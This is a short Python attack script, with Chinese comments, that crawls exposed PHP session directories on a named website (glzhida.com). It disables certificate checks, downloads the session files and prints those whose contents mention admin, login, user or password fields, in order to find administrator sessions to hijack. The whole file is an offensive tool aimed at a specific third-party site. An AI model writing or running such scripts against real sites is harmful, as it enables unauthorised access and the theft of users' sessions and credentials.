#!/usr/bin/env python3
"""glzhida_sessions.py - 批量读取glzhida.com session文件找管理员会话"""
import urllib.request, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://glzhida.com/data'

def fetch(url, timeout=8):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(30000).decode('utf-8', 'ignore')
    except Exception:
        return ''

# 所有session目录
dirs = ['sessions', 'sessions_1b3b5c46ec', 'sessions_44dd8de774', 'sessions_592ad056e6', 'sessions_734a511aa9']
for d in dirs:
    listing = fetch(BASE + '/' + d + '/')
    sess_files = re.findall(r'href="(sess_[^"]+)"', listing)
    if not sess_files:
        continue
    print('=== %s (%d sessions) ===' % (d, len(sess_files)), flush=True)
    for sf in sess_files[:15]:
        content = fetch(BASE + '/' + d + '/' + sf)
        # 找管理员特征
        if any(k in content.lower() for k in ['admin', 'userid', 'login', 'user', 'pwd', 'logintime']):
            print('  ADMIN-SESS: %s -> %s' % (sf, content[:120].replace(chr(10), ' ')), flush=True)
    print('', flush=True)
print('=== DONE ===')
